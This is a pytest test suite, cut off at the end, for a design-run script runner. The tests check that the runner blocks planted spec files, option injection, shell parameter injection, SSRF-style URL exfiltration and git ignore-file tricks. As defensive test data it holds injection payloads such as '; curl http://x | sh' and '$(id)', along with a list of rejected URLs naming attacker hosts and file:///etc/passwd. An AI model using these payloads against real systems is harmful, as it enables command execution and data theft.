"""Tests for references/design-intel/scripts/design_run.py (task shode-house-v7u.4.6, slice W12).

Design: ADR iter 5 section 5.6 as replaced by addendum 1 and addendum 2 (A15, SAC-22..27).
Every git process started here goes through tests/fixtures/design_run/gitiso.py (isolated HOME,
GIT_CONFIG_GLOBAL, XDG_CONFIG_HOME, GIT_CONFIG_NOSYSTEM=1); the runner under test gets the same
HOME. Fixture repositories live under pytest's tmp_path, never inside this checkout.

Most fixtures run the runner in-process (so mutation tests can monkeypatch one check off); the
harness asserts, for every in-process run, that an exit 3 started no child process and that every
runner git call carried the safe prefix. A few tests run `python3 -I design_run.py` for real.
"""
import builtins
import contextlib
import hashlib
import importlib.util
import io
import json
import os
import shutil
import signal
import stat
import subprocess
import sys
import time
from pathlib import Path

import pytest

ROOT = Path(__file__).resolve().parents[1]
SCRIPTS = ROOT / "references" / "design-intel" / "scripts"
RUNNER = SCRIPTS / "design_run.py"
CATALOGUE = SCRIPTS / "design_run_catalogue.json"
FIXTURES = ROOT / "tests" / "fixtures" / "design_run"
sys.path.insert(0, str(FIXTURES))
import gitiso  # noqa: E402

PY = sys.executable
TASK = "t-1"
SAFE_PREFIX = ["--no-optional-locks", "--no-pager", "-c", "core.fsmonitor=false",
               "-c", "core.untrackedCache=false", "-c", "core.hooksPath=/dev/null"]
SHEBANG = "#!" + PY if " " not in PY else "#!/usr/bin/env python3"


def load_runner():
    spec = importlib.util.spec_from_file_location("design_run_under_test", RUNNER)
    mod = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(mod)
    return mod


@pytest.fixture
def dr():
    return load_runner()


# ------------------------------------------------------------------------------------------------
# session guard: test_git_isolation (c) -- the developer's real git config is never touched
# ------------------------------------------------------------------------------------------------

_WATCHED = gitiso.watched_config_paths(os.environ.get("XDG_CONFIG_HOME"))
_BEFORE = gitiso.stat_snapshot(_WATCHED)


@pytest.fixture(scope="session", autouse=True)
def real_git_config_untouched():
    yield
    after = gitiso.stat_snapshot(_WATCHED)
    assert after == _BEFORE, "real git config metadata changed during the design-run tests"


# ------------------------------------------------------------------------------------------------
# fixture project
# ------------------------------------------------------------------------------------------------

STUB = r'''{shebang}
import json, os, sys, time
MARK = {mark!r}
CTL = {ctl!r}
rec = {{"argv": sys.argv[1:], "argv0_real": os.path.realpath(sys.argv[0]),
        "env": dict(os.environ), "cwd": os.getcwd(), "pid": os.getpid()}}
with open(MARK, "a") as fh:
    fh.write(json.dumps(rec) + "\n")
ctl = json.load(open(CTL)) if os.path.exists(CTL) else {{}}
sys.stdout.write(ctl.get("stdout", "stub ok\n"))
sys.stderr.write(ctl.get("stderr", ""))
for rel in ctl.get("create", []):
    os.makedirs(os.path.dirname(rel) or ".", exist_ok=True)
    open(rel, "w").write("created\n")
args = sys.argv[1:]
save = None
if "--save" in args:
    # @axe-core/cli 4.13.0 saveOutcome (dist/src/lib/utils.js:17-33): path.join(dir || cwd, name),
    # which concatenates an absolute name; mkdirSync(dir) only; a failed open exits 1
    base = args[args.index("--dir") + 1] if "--dir" in args else os.getcwd()
    if not os.path.isabs(base):
        base = os.path.join(os.getcwd(), base)
    save = os.path.normpath(base + "/" + args[args.index("--save") + 1])
    if "save_text" in ctl and not os.path.exists(save):
        os.makedirs(base, exist_ok=True)
    if "save_text" in ctl and not os.path.isdir(os.path.dirname(save)):
        sys.stderr.write("Unable to save file!\nError: ENOENT: no such file or directory, open %r\n" % save)
        sys.exit(1)
elif args and args[0] == "screenshot":
    save = args[-1]
if save is not None and "save_text" in ctl:
    target = save
    if ctl.get("save_as_symlink"):
        target = os.path.join(os.path.dirname(save), "real-target.json")
    with open(target, "w") as fh:
        fh.write(ctl["save_text"])
    if ctl.get("save_as_symlink"):
        os.symlink(target, save)
    for name, text in ctl.get("extra_files", {{}}).items():
        open(os.path.join(os.path.dirname(save), name), "w").write(text)
    if ctl.get("saved_flag"):
        open(ctl["saved_flag"], "w").write(str(os.getpid()))
time.sleep(ctl.get("sleep", 0))
sys.exit(ctl.get("exit", 0))
'''

STUB_SEARCH = r'''{shebang}
import json, os, sys
MARK = {mark!r}
CTL = {ctl!r}
with open(MARK, "a") as fh:
    fh.write(json.dumps({{"argv": sys.argv[1:], "env": dict(os.environ)}}) + "\n")
ctl = json.load(open(CTL)) if os.path.exists(CTL) else {{}}
print(json.dumps({{"design_system": {{"colors": {{"primary": "#000000", "background": "#FFFFFF"}}}}}}))
sys.exit(ctl.get("exit", 0))
'''

HOSTILE = "#!/bin/sh\necho ran >> {mark}\ncat\n"


class Result:
    def __init__(self, code, out, err, root, spawns, git_calls, opens=None):
        self.code, self.out, self.err, self.root = code, out, err, root
        self.spawns, self.git_calls, self.opens = spawns, git_calls, opens or []
        self.report = None
        for line in out.splitlines():
            if line.startswith("design-run: report="):
                rel = line.split("report=", 1)[1].rsplit(" exit=", 1)[0]
                self.report = json.loads((Path(root) / rel).read_text())

    def run(self, rid):
        return next(r for r in self.report["runs"] if r["id"] == rid)


class Proj:
    def __init__(self, tmp):
        self.tmp = Path(tmp)
        self.root = self.tmp / "proj"
        self.markers = self.tmp / "markers"
        self.ctl = self.tmp / "stubctl"
        self.sysbin = self.tmp / "sysbin"
        for d in (self.root, self.markers, self.ctl, self.sysbin):
            d.mkdir(parents=True, exist_ok=True)
        self.path = "%s:/usr/bin:/bin" % self.sysbin
        self.scripts_dir = None

    # git / files ----------------------------------------------------------------------------
    def git(self, *argv, **kw):
        return gitiso.git_isolated(list(argv), self.tmp, cwd=self.root, **kw)

    def write(self, rel, text="x\n", mode=None):
        p = self.root / rel
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(text)
        if mode:
            p.chmod(mode)
        return p

    def commit(self, msg="c"):
        self.git("add", "-A")
        self.git("commit", "-q", "--allow-empty", "-m", msg)

    def hostile(self, name):
        p = self.tmp / "hostile" / name
        p.parent.mkdir(parents=True, exist_ok=True)
        p.write_text(HOSTILE.format(mark=self.markers / ("HOSTILE-" + name)))
        p.chmod(0o755)
        return p

    def hostiles(self):
        return sorted(p.name for p in self.markers.glob("HOSTILE-*"))

    def stub_calls(self, name):
        p = self.markers / (name + ".jsonl")
        if not p.exists():
            return []
        return [json.loads(line) for line in p.read_text().splitlines() if line.strip()]

    def set_ctl(self, name, **ctl):
        (self.ctl / (name + ".json")).write_text(json.dumps(ctl))

    def stub_text(self, name):
        return STUB.format(shebang=SHEBANG, mark=str(self.markers / (name + ".jsonl")),
                           ctl=str(self.ctl / (name + ".json")))

    def setup_default(self):
        self.git("init", "-q")
        self.write(".gitignore", "node_modules/\ndist/\ntest-results/\nplaywright-report/\n")
        self.write("package.json", '{"name": "fixture", "private": true}\n')
        self.write("package-lock.json", "{}\n")
        self.write("playwright.config.ts", "export default {};\n")
        self.write("tests/visual/checkout.spec.ts", "// tracked spec\n")
        self.write("tests/states/checkout.spec.ts", "// tracked state spec\n")
        self.commit("init")
        # npm layout: .bin/playwright -> ../playwright/cli.js ; pnpm-shim layout: regular .bin/axe
        self.write("node_modules/playwright/cli.js", self.stub_text("playwright"), 0o755)
        (self.root / "node_modules/.bin").mkdir(parents=True, exist_ok=True)
        os.symlink("../playwright/cli.js", self.root / "node_modules/.bin/playwright")
        self.write("node_modules/.bin/axe", self.stub_text("axe"), 0o755)
        # a node outside the project: resolved by the runner, never executed
        node = self.sysbin / "node"
        node.write_text(HOSTILE.format(mark=self.markers / "HOSTILE-node-executed"))
        node.chmod(0o755)
        for pm in ("pnpm", "npx", "npm", "yarn", "corepack"):
            p = self.sysbin / pm
            p.write_text(HOSTILE.format(mark=self.markers / ("HOSTILE-pm-" + pm)))
            p.chmod(0o755)
        return self

    def stub_scripts(self):
        """A plugin-scripts directory whose search.py is a recording stub (in-process runs only)."""
        d = self.tmp / "stub-scripts"
        d.mkdir(exist_ok=True)
        (d / "search.py").write_text(STUB_SEARCH.format(
            shebang=SHEBANG, mark=str(self.markers / "search.jsonl"), ctl=str(self.ctl / "search.json")))
        (d / "check_contrast.py").write_text((SCRIPTS / "check_contrast.py").read_text())
        self.scripts_dir = d
        return d

    # order / request ------------------------------------------------------------------------
    def order(self, runs, phase="3a", it=1, change_paths=(), loopback_ports=None,
              change_confirmation=None, order_extra=None, request_extra=None,
              raw_request=None, raw_order=None, task=TASK, req_task=None, nn="02"):
        out = self.root / "outputs" / TASK
        out.mkdir(parents=True, exist_ok=True)
        req_rel = "outputs/%s/01-ux-design-run-request-%s-iter%d.json" % (TASK, phase, it)
        if raw_request is None:
            req = {"schema": 1, "task": req_task or task, "phase": phase, "iter": it, "runs": runs}
            if request_extra:
                req.update(request_extra)
            raw_request = json.dumps(req, ensure_ascii=False)
        rb = raw_request.encode("utf-8") if isinstance(raw_request, str) else raw_request
        (self.root / req_rel).write_bytes(rb)
        order_rel = "outputs/%s/%s-design-run-order-%s-iter%d.json" % (TASK, nn, phase, it)
        if raw_order is None:
            order = {"schema": 1, "task": task, "phase": phase, "iter": it, "request_path": req_rel,
                     "request_sha256": hashlib.sha256(rb).hexdigest(), "change_paths": list(change_paths),
                     "loopback_ports": loopback_ports}
            if change_confirmation is not None:
                order["change_confirmation"] = change_confirmation
            if order_extra:
                order.update(order_extra)
            raw_order = json.dumps(order, ensure_ascii=False)
        ob = raw_order.encode("utf-8") if isinstance(raw_order, str) else raw_order
        (self.root / order_rel).write_bytes(ob)
        return order_rel, hashlib.sha256(ob).hexdigest()

    # running --------------------------------------------------------------------------------
    def env(self, extra=None, path=None):
        return gitiso.runner_env(self.tmp, path or self.path, extra)

    def run(self, dr, order_rel, sha, extra_env=None, patches=(), audit=True, path=None,
            spy_open=False, argv=None, cwd=None):
        env = self.env(extra_env, path)
        spawns, git_calls, opens = [], [], []
        real_spawn, real_git = dr._spawn_child, dr._git_call

        def spawn(argv_, *a, **k):
            spawns.append(list(argv_))
            return real_spawn(argv_, *a, **k)

        def gitcall(argv_, *a, **k):
            git_calls.append(list(argv_))
            return real_git(argv_, *a, **k)

        dr._spawn_child, dr._git_call = spawn, gitcall
        undo = []
        for obj, name, value in patches:
            undo.append((obj, name, getattr(obj, name)))
            setattr(obj, name, value)
        if self.scripts_dir is not None:
            undo.append((dr, "SCRIPTS_DIR", dr.SCRIPTS_DIR))
            dr.SCRIPTS_DIR = self.scripts_dir
        undo.append((dr, "_is_isolated", dr._is_isolated))
        dr._is_isolated = lambda: True
        if spy_open:
            real_open, real_osopen = builtins.open, os.open

            def spy(path_, mode="r", *a, **k):
                opens.append((str(path_), mode))
                return real_open(path_, mode, *a, **k)

            def spy_os(path_, flags, *a, **k):
                opens.append((str(path_), "w" if flags & (os.O_WRONLY | os.O_RDWR) else "r"))
                return real_osopen(path_, flags, *a, **k)

            undo += [(builtins, "open", real_open), (os, "open", real_osopen)]
            builtins.open, os.open = spy, spy_os
        saved_env, saved_cwd = dict(os.environ), os.getcwd()
        out, err = io.StringIO(), io.StringIO()
        try:
            os.environ.clear()
            os.environ.update(env)
            os.chdir(str(cwd or self.root))
            with contextlib.redirect_stdout(out), contextlib.redirect_stderr(err):
                code = dr.main(argv if argv is not None else ["--order", order_rel, "--sha256", sha])
        finally:
            for obj, name, value in reversed(undo):
                setattr(obj, name, value)
            dr._spawn_child, dr._git_call = real_spawn, real_git
            os.chdir(saved_cwd)
            os.environ.clear()
            os.environ.update(saved_env)
        res = Result(code, out.getvalue(), err.getvalue(), self.root, spawns, git_calls, opens)
        if audit:
            if code == 3:
                assert spawns == [], "exit 3 must start no child process: %r" % spawns
                assert res.out == "", "exit 3 prints nothing on stdout"
                assert res.err.startswith("BLOCKED: ")
            for call in git_calls:
                assert call[1:] == ["--version"] or call[1:1 + len(SAFE_PREFIX)] == SAFE_PREFIX, call
                if "status" in call:
                    assert "--ignore-submodules=all" in call, call
        return res

    def cli(self, order_rel, sha, isolated=True, extra_args=(), env_extra=None, runner=RUNNER):
        cmd = [PY] + (["-I"] if isolated else []) + [str(runner), "--order", order_rel, "--sha256", sha]
        cmd += list(extra_args)
        return subprocess.run(cmd, cwd=str(self.root), env=self.env(env_extra), stdin=subprocess.DEVNULL,
                              stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=120)


@pytest.fixture
def proj(tmp_path):
    return Proj(tmp_path).setup_default()


def blocked(res, token):
    assert res.code == 3, (res.code, res.out, res.err)
    assert res.err.startswith("BLOCKED: " + token), res.err
    return res.err


RUN_UI = {"id": "r1", "script_id": "ui-capture", "params": {"feature": "checkout"}}
RUN_STATE = {"id": "r1", "script_id": "state-tests", "params": {"feature": "checkout"}}
RUN_SHOT = {"id": "r1", "script_id": "ui-screenshot",
            "params": {"viewport_w": 1280, "viewport_h": 720, "url": "http://localhost:3000/"}}
RUN_DIFF = {"id": "r1", "script_id": "visual-diff", "params": {}}
RUN_AXE = {"id": "r1", "script_id": "axe-scan", "params": {"url": "http://localhost:3000/checkout"}}
# I-4 (U5): the CLI saves to path.join(--dir, --save), so the stage goes in --dir, a bare name in --save
AXE_ARGV = ["{url}", "--dir", "<out>/", "--save", "<run-id>.axe.json"]
RUN_PAIR = {"id": "r1", "script_id": "contrast-pair", "params": {"fg": "#000000", "bg": "#FFFFFF"}}


# ------------------------------------------------------------------------------------------------
# happy paths, CLI, report
# ------------------------------------------------------------------------------------------------

def test_happy_search_real_search_py_under_isolated_mode(proj):
    order, sha = proj.order([
        {"id": "r1", "script_id": "design-search", "params": {"query": "hotel booking dashboard",
                                                              "variance": 4, "motion": 3, "density": 6,
                                                              "project": "Acme Booking"}},
        {"id": "r2", "script_id": "design-query-domain", "params": {"query": "minimal", "domain": "style", "n": 2}},
    ], phase="1b")
    p = proj.cli(order, sha)
    assert p.returncode == 0, p.stderr.decode()
    line = p.stdout.decode().strip()
    assert line.startswith("design-run: report=outputs/t-1/design-run/02-design-run-order-1b-iter1.report.json")
    assert line.endswith(" exit=0")
    rep = json.loads((proj.root / "outputs/t-1/design-run/02-design-run-order-1b-iter1.report.json").read_text())
    for key in ("runner", "order", "request", "path_sanitised", "git", "tree_check", "runs", "exit"):
        assert key in rep, key
    assert rep["runner"]["python"]["realpath"] == os.path.realpath(PY)
    assert len(rep["runner"]["catalogue_sha256"]) == 64
    assert rep["runner"]["version"] == "2.0.0"  # UD R73/U14: contract SemVer for 4.0.0 (R69 removed order keys = MAJOR)
    for r in rep["runs"]:
        assert r["status"] == "exit" and r["exit_code"] == 0
        assert set(r["redactions"]) == {"stdout", "stderr", "argv", "artifacts"}
        assert r["argv"][1] == "-I"
        for stream in ("stdout", "stderr"):
            f = proj.root / r[stream]["path"]
            assert hashlib.sha256(f.read_bytes()).hexdigest() == r[stream]["sha256"]
            assert f.stat().st_size == r[stream]["bytes"]
        assert "env_names" in r and "GITHUB_TOKEN" not in r["env_names"]
    ds = json.loads((proj.root / "outputs/t-1/design-run/02-design-run-order-1b-iter1/r1.json").read_text())
    assert ds["design_system"]["project_name"] == "Acme Booking"


def test_contrast_check_reads_the_earlier_run_json(proj):
    order, sha = proj.order([
        {"id": "r1", "script_id": "design-search", "params": {"query": "fintech dashboard", "variance": 3,
                                                              "motion": 2, "density": 7, "project": "Pay"}},
        {"id": "r2", "script_id": "contrast-check", "params": {"ds": "r1"}},
    ], phase="1b")
    p = proj.cli(order, sha)
    assert p.returncode in (0, 1), p.stderr.decode()  # a contrast FAIL is a valid result
    rep = json.loads((proj.root / "outputs/t-1/design-run/02-design-run-order-1b-iter1.report.json").read_text())
    r2 = rep["runs"][1]
    assert r2["status"] == "exit" and r2["exit_code"] in (0, 1)
    assert r2["argv"][-1].endswith("outputs/t-1/design-run/02-design-run-order-1b-iter1/r1.json")
    text = (proj.root / r2["stdout"]["path"]).read_text()
    assert "WCAG" in text and "pair(s) checked" in text


def test_cli_usage_errors_exit_2(proj):
    order, sha = proj.order([RUN_PAIR])
    assert proj.cli(order, sha, extra_args=["--force"]).returncode == 2
    assert proj.cli(order, "nothex").returncode == 2
    p = subprocess.run([PY, "-I", str(RUNNER)], cwd=str(proj.root), env=proj.env(), stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE)
    assert p.returncode == 2


def test_design_run_not_isolated(proj):
    order, sha = proj.order([RUN_PAIR])
    p = proj.cli(order, sha, isolated=False)
    assert p.returncode == 3
    assert p.stderr.decode().startswith("BLOCKED: design-run-untrusted-input interpreter")
    assert p.stdout == b""


def test_plugin_root_unset_fails_closed_without_running_a_project_file(proj):
    """Executor line with CLAUDE_PLUGIN_ROOT unset resolves to /references/... (absent)."""
    planted = proj.write("references/design-intel/scripts/design_run.py",
                         "open(%r, 'w').write('ran')\n" % str(proj.markers / "HOSTILE-project-runner"))
    assert planted.exists()
    order, sha = proj.order([RUN_PAIR])
    env = proj.env()
    env.pop("CLAUDE_PLUGIN_ROOT", None)
    line = 'python3 -I "${CLAUDE_PLUGIN_ROOT}/references/design-intel/scripts/design_run.py" --order %s --sha256 %s' % (order, sha)
    p = subprocess.run(["/bin/sh", "-c", line], cwd=str(proj.root), env=env, stdout=subprocess.PIPE,
                       stderr=subprocess.PIPE)
    assert p.returncode != 0
    assert proj.hostiles() == []


def test_contrast_pair_inprocess_and_report_fields(proj, dr):
    order, sha = proj.order([RUN_PAIR])
    res = proj.run(dr, order, sha)
    assert res.code == 0, res.err
    rep = res.report
    assert rep["git"]["version"].startswith("git version ")
    # the runner resolves git on its own sanitised PATH, not on the developer's (Chris W12 S-5)
    assert rep["git"]["path"] == os.path.realpath(shutil.which("git", path=proj.path))
    assert rep["path_sanitised"] == proj.path.split(":")
    assert rep["order"]["sha256"] == sha
    assert rep["exit"] == 0 and rep["error"] is None
    assert len(res.spawns) == 1


# ------------------------------------------------------------------------------------------------
# SAC-22: planted spec, option and param injection, URL exfiltration
# ------------------------------------------------------------------------------------------------

def test_design_run_planted_spec(proj, dr):
    proj.write("tests/visual/x.spec.ts", "// planted\n")
    o, s = proj.order([RUN_UI])
    assert "tests/visual/x.spec.ts" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert proj.stub_calls("playwright") == []
    os.remove(proj.root / "tests/visual/x.spec.ts")

    proj.write("playwright.config.ts", "export default { globalSetup: './evil' };\n")
    o, s = proj.order([RUN_UI], it=2)
    assert "playwright.config.ts" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert proj.stub_calls("playwright") == []
    proj.git("checkout", "--", "playwright.config.ts")

    proj.write("outputs/t-1/helper.js", "module.exports = 1;\n")
    o, s = proj.order([RUN_UI], it=3)
    assert "outputs/t-1/helper.js" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert proj.stub_calls("playwright") == []
    os.remove(proj.root / "outputs/t-1/helper.js")


def test_design_run_planted_spec_router_named_runs(proj, dr):
    proj.write("tests/visual/newpage.spec.ts", "// written by the implementer\n")
    o, s = proj.order([{"id": "r1", "script_id": "ui-capture", "params": {"feature": "newpage"}}],
                      change_paths=["tests/visual/newpage.spec.ts"])
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    calls = proj.stub_calls("playwright")
    assert len(calls) == 1
    assert calls[0]["argv"] == ["test", r"tests/visual/newpage\.spec\.ts$", "--update-snapshots=none"]


OPTION_CASES = [
    ({"id": "r1", "script_id": "design-search", "params": {"query": "--force", "variance": 1, "motion": 1,
                                                           "density": 1, "project": "p"}}, "1b", "r1.query"),
    ({"id": "r1", "script_id": "design-search", "params": {"query": "q", "variance": 1, "motion": 1,
                                                           "density": 1, "project": "-o/tmp"}}, "1b", "r1.project"),
    ({"id": "r1", "script_id": "ui-capture", "params": {"feature": "-x"}}, "3a", "r1.feature"),
]


@pytest.mark.parametrize("run,phase,where", OPTION_CASES)
def test_design_run_option_injection(proj, dr, run, phase, where):
    o, s = proj.order([run], phase=phase)
    assert where in blocked(proj.run(dr, o, s), "design-run-param")
    assert proj.stub_calls("playwright") == [] and proj.hostiles() == []


def test_design_run_option_injection_reason(proj, dr):
    o, s = proj.order([
        {"id": "r1", "script_id": "design-search", "params": {"query": "q", "variance": 1, "motion": 1,
                                                              "density": 1, "project": "p"}},
        {"id": "r2", "script_id": "contrast-check-decorative", "params": {"ds": "r1", "reason": "--help"}},
    ], phase="1b")
    assert "r2.reason" in blocked(proj.run(dr, o, s), "design-run-param")


def test_mutation_leading_dash_check_off_turns_option_injection_red(proj, dr):
    run, phase, _ = OPTION_CASES[0]
    o, s = proj.order([run], phase=phase)
    res = proj.run(dr, o, s, patches=[(dr, "_starts_with_dash", lambda v: False)], audit=False)
    assert res.code != 3  # the fixture's assertion (exit 3) no longer holds
    assert res.run("r1")["argv"][-1] == "--force"


PAYLOADS = ["; curl http://x | sh", "it's", 'say "hi"', "back`tick`", "$(id)"]


def test_design_run_param_injection(proj, dr):
    proj.stub_scripts()
    runs = [{"id": "r%d" % i, "script_id": "design-query-domain",
             "params": {"query": q, "domain": "style", "n": 1}} for i, q in enumerate(PAYLOADS, 1)]
    o, s = proj.order(runs)
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    calls = proj.stub_calls("search")
    assert len(calls) == len(PAYLOADS) == len(res.spawns)  # exactly one child per run
    for call, q in zip(calls, PAYLOADS):
        assert call["argv"][-1] == q  # one inert argv element, byte for byte
        assert call["argv"][-2] == "--"
    assert proj.hostiles() == []


@pytest.mark.parametrize("bad", ["a\nb", "a\rb", "a\tb", "a\x00b", "a\u202eb", " lead", "trail "])
def test_design_run_param_injection_control_chars(proj, dr, bad):
    o, s = proj.order([{"id": "r1", "script_id": "design-query-domain",
                        "params": {"query": bad, "domain": "style", "n": 1}}])
    blocked(proj.run(dr, o, s), "design-run-param r1.query")


def test_mutation_shell_true_turns_param_injection_red(proj, dr):
    proj.stub_scripts()
    mark = proj.markers / "HOSTILE-shell"
    payload = "x; touch %s" % mark
    o, s = proj.order([{"id": "r1", "script_id": "design-query-domain",
                        "params": {"query": payload, "domain": "style", "n": 1}}])
    real = dr._spawn_child

    def shell_spawn(argv, cwd, env, out_f, err_f, timeout):
        p = subprocess.Popen(" ".join(argv), shell=True, cwd=cwd, env=env, stdout=out_f, stderr=err_f,
                             stdin=subprocess.DEVNULL)
        return "exit", p.wait(timeout)

    proj.run(dr, o, s, patches=[(dr, "_spawn_child", shell_spawn)], audit=False)
    calls = proj.stub_calls("search")
    fixture_holds = bool(calls) and calls[0]["argv"][-1] == payload and not mark.exists()
    assert not fixture_holds
    assert real is dr._spawn_child  # patch undone


URL_REJECT = [
    "http://evil.example/?d=x", "http://user@localhost/", "http://localhost.evil.example/",
    "http://127.0.0.1.nip.io/", "http://localhost/?a=..%2F", "file:///etc/passwd",
    "http://localhost./", "http://2130706433/", "http://localhost:3000@evil.com/",
    "http://localhost:80\\evil.com/", "http://\uff4c\uff4f\uff43\uff41\uff4c\uff48\uff4f\uff53\uff54/",
    "http://localhost:0/", "http://localhost/#frag", "https://localhost:65536/", "http://LOCALHOST./",
    "http://127.0.0.1.attacker/", "http://localhost/" + "a" * 300,
    # Sentinel W12 S-2: spellings Python's parser and a browser read differently
    "http://localhost:+3000/", "http://localhost:٣٠٠٠/", "http://[::1]x:3000/",
    "http://[localhost]:3000/", "http://localhost:3000 /", "http://localhost:03000x/",
]


@pytest.mark.parametrize("url", URL_REJECT[-6:] + ["http://localhost:3000@x/", "http://localhost:99999/"])
def test_url_ok_netloc_ascii_fullmatch_unit(dr, url):
    """The check itself (not only the shared param rule) rejects every Sentinel S-2 spelling."""
    assert dr._url_ok(url, {"loopback_ports": None}) is False
    assert dr._url_ok("http://localhost:3000/", {"loopback_ports": [3000]}) is True


@pytest.mark.parametrize("url", URL_REJECT)
def test_design_run_url_exfil(proj, dr, url):
    o, s = proj.order([{"id": "r1", "script_id": "axe-scan", "params": {"url": url}}])
    blocked(proj.run(dr, o, s), "design-run-param r1.url")
    assert proj.stub_calls("axe") == []


def test_design_run_url_exfil_accepted_forms(proj, dr):
    o, s = proj.order([{"id": "r1", "script_id": "axe-scan", "params": {"url": "http://[::1]:3000/"}},
                       {"id": "r2", "script_id": "axe-scan", "params": {"url": "http://LOCALHOST:3000/a/b?x=1&y_2=z"}}],
                      loopback_ports=[3000])
    res = proj.run(dr, o, s)
    assert res.code == 0, res.err
    assert [c["argv"][0] for c in proj.stub_calls("axe")] == ["http://[::1]:3000/", "http://LOCALHOST:3000/a/b?x=1&y_2=z"]


def test_design_run_url_exfil_loopback_port_pin(proj, dr):
    o, s = proj.order([{"id": "r1", "script_id": "axe-scan", "params": {"url": "http://localhost:8080/"}}],
                      loopback_ports=[3000])
    blocked(proj.run(dr, o, s), "design-run-param r1.url")
    o, s = proj.order([{"id": "r1", "script_id": "axe-scan", "params": {"url": "http://localhost/"}}],
                      loopback_ports=[3000], it=2)
    blocked(proj.run(dr, o, s), "design-run-param r1.url")  # effective port 80


# R69: design runs target loopback only in 4.0.0; the user-confirmed preview origin is gone

PREVIEW = "https://preview.example.com"
RUN_PREVIEW = {"id": "r1", "script_id": "axe-scan", "params": {"url": PREVIEW + "/checkout"}}


def test_design_run_non_loopback_url_is_refused(proj, dr):
    o, s = proj.order([RUN_PREVIEW])                  # no port pin, so only the host can refuse it
    res = proj.run(dr, o, s)
    assert (res.code, res.err) == (3, "BLOCKED: design-run-param r1.url\n"), (res.code, res.err)
    assert proj.stub_calls("axe") == []
    assert sorted(p.name for p in (proj.root / "outputs" / TASK).iterdir()) == [
        "01-ux-design-run-request-3a-iter1.json", "02-design-run-order-3a-iter1.json"]


@pytest.mark.parametrize("fields,key", [
    ({"preview_origin": PREVIEW}, "preview_origin"),
    ({"preview_origin": PREVIEW, "preview_confirmation": "yes, scan the preview at preview.example.com"},
     "preview_confirmation"),
    ({"preview_confirmation": "yes"}, "preview_confirmation"),
    ({"preview_origin": None, "preview_confirmation": None}, "preview_confirmation"),
])
def test_design_run_order_with_preview_fields_is_refused(proj, dr, fields, key):
    o, s = proj.order([RUN_PREVIEW], order_extra=fields)
    res = proj.run(dr, o, s)
    assert (res.code, res.err) == (3, "BLOCKED: design-run-schema order key %s\n" % key), (res.code, res.err)
    assert proj.stub_calls("axe") == []
    assert not (proj.root / "outputs" / TASK / "design-run").exists()


def test_url_ok_refuses_a_non_loopback_url_whatever_the_order_says_unit(dr):
    order = {"loopback_ports": None, "preview_origin": PREVIEW, "preview_confirmation": "yes"}
    assert dr._url_ok(PREVIEW + "/checkout", order) is False
    assert dr._url_ok("http://localhost:3000/checkout", order) is True
    assert not {"preview_origin", "preview_confirmation"} & dr.ORDER_KEYS


# ------------------------------------------------------------------------------------------------
# SAC-25: tree check E1-E3 (ignore sources, collisions, OS files, index flags)
# ------------------------------------------------------------------------------------------------

def test_design_run_self_ignored_spec(proj, dr):
    proj.write("x/.gitignore", "*\n")
    proj.write("x/tests/visual/checkout.spec.ts", "// planted, hidden by x/.gitignore\n")
    for i, run in enumerate((RUN_SHOT, RUN_UI), 1):
        o, s = proj.order([run], it=i)
        err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
        assert "x/ (ignore-source x/.gitignore)" in err
    assert proj.stub_calls("playwright") == []


def test_mutation_ignore_source_check_off_turns_self_ignored_spec_red(proj, dr):
    proj.write("x/.gitignore", "*\n")
    proj.write("x/tests/visual/checkout.spec.ts", "// planted\n")
    o, s = proj.order([RUN_SHOT])
    res = proj.run(dr, o, s, patches=[(dr, "_ignore_source_trusted", lambda *a, **k: True)], audit=False)
    assert res.code == 0 and proj.stub_calls("playwright")


def test_design_run_info_exclude(proj, dr):
    with open(proj.root / ".git/info/exclude", "a") as fh:
        fh.write("tests/visual/checkout.spec.tsx\n")
    proj.write("tests/visual/checkout.spec.tsx", "// planted\n")
    for i, run in enumerate((RUN_SHOT, RUN_DIFF), 1):
        o, s = proj.order([run], it=i)
        err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
        assert "tests/visual/checkout.spec.tsx (ignore-source .git/info/exclude)" in err
    assert proj.stub_calls("playwright") == []


def test_design_run_excludesfile_local(proj, dr):
    gx = proj.tmp / "gx-local"
    gx.write_text("gx/\n")
    proj.git("config", "core.excludesFile", str(gx))
    proj.write("gx/tests/visual/checkout.spec.ts", "// planted\n")
    o, s = proj.order([RUN_SHOT])
    assert "git-config core.excludesfile" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert proj.stub_calls("playwright") == []


def test_design_run_excludesfile_global(proj, dr):
    gx = proj.tmp / "home" / "gx"
    gx.write_text("gx/\n")
    (proj.tmp / "home" / ".gitconfig").write_text("[core]\n\texcludesFile = %s\n" % gx)
    proj.write("gx/tests/visual/checkout.spec.ts", "// planted\n")
    o, s = proj.order([RUN_SHOT])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert "gx/ (ignore-source %s)" % gx in err
    assert proj.stub_calls("playwright") == []


def test_design_run_gitignore_modified(proj, dr):
    with open(proj.root / ".gitignore", "a") as fh:
        fh.write("evil/\n")
    proj.write("evil/tests/visual/checkout.spec.ts", "// planted\n")
    o, s = proj.order([RUN_SHOT])
    assert "evil/" in blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    proj.git("update-index", "--assume-unchanged", ".gitignore")
    o, s = proj.order([RUN_SHOT], it=2)
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert "evil/ (ignore-source .gitignore)" in err
    assert proj.stub_calls("playwright") == []


def test_design_run_filter_collision(proj, dr):
    proj.write("dist/tests/visual/checkout.spec.ts", "// planted under a tracked ignore rule\n")
    o, s = proj.order([RUN_UI])
    err = blocked(proj.run(dr, o, s), "design-run-untrusted-input")
    assert "dist/tests/visual/checkout.spec.ts (filter-collision)" in err
    os.remove(proj.root / "dist/tests/visual/checkout.spec.ts")
    proj.write("dist/a.spec.ts", "// planted\n")
    o, s = proj.order([RUN_DIFF], it=2)
